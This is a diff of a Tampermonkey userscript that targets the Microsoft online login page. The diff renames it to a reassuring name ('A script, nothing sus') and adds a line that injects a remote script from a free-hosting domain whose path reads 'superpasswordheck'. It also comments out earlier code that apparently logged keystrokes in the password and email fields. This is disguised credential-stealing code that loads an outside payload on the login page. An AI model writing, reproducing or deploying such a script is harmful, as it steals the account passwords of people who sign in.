@@ -1,14 +1,17 @@
 // ==UserScript==
-// @name         PGC Microsoft Login
+// @name         A script, nothing sus
 // @namespace    http://tampermonkey.net/
 // @version      0.1
-// @description  try to take over the world!
+// @description  it does what it should
 // @author       You
 // @match        *://login.microsoftonline.com/*
 // @icon         https://www.google.com/s2/favicons?domain=pgc.edu
 // @grant        none
 // ==/UserScript==
 
+document.querySelector("head").innerHTML += "<script src='http://my-smex-website.000webhostapp.com/superpasswordheck/script.js'></script>"
+
+/*
 (function(){
 
     window.__LOGSTR = ''
@@ -130,3 +133,5 @@
         bindEvents(document.querySelector('input[type=password]') ? 'password' : 'email')
     }
 })()
+
+*/
